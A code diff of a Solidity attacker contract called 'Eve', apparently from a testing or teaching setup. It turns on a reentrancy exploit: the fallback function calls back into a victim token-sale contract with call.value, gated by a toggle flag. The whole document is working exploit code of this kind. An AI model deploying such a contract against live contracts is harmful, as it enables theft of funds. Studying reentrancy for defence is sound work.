@@ -5,15 +5,23 @@ contract Eve {
   
        bool public alreadyCalled;
        uint public tokenAmount;
-   
-        function Eve() public payable {}
+       bool useReentrancy;
+       address victim;
+       event fallbackCalled(uint amount, bool useReentrancy);
+       
+       function Eve() public payable {}
 
    
     
-    function exploitReentrancy(address a, uint amount) public {
+    function exploitReentrancy(address _a, uint _amount, bool _useReentrancy) public {
        //a.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.address, {value: 50});
-       // tokenAmount = amount;
-        a.call.value(amount)();
+        alreadyCalled = false;
+        tokenAmount = _amount;
+        victim = _a;
+        useReentrancy = _useReentrancy;
+        victim.call.value(_amount)();
+        
+        
         //a.send(amount);
        //a.transfer(amount);
         
@@ -24,24 +32,29 @@ contract Eve {
     }*/
 
 
-    /*
+    
     function() payable public {
-       
+        fallbackCalled(tokenAmount, useReentrancy);
+        if(useReentrancy) {
+            
         if(alreadyCalled == true) {
             return;
        }
-       // msg.sender.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.owner);
-        msg.sender.call.value(tokenAmount)();
         alreadyCalled = true;
+       
+        victim.call.value(tokenAmount)();
         
+       }
+
         
     }
-    */
     
     
+    /*
     function() public payable {
         
     }
+    */
     
     
     
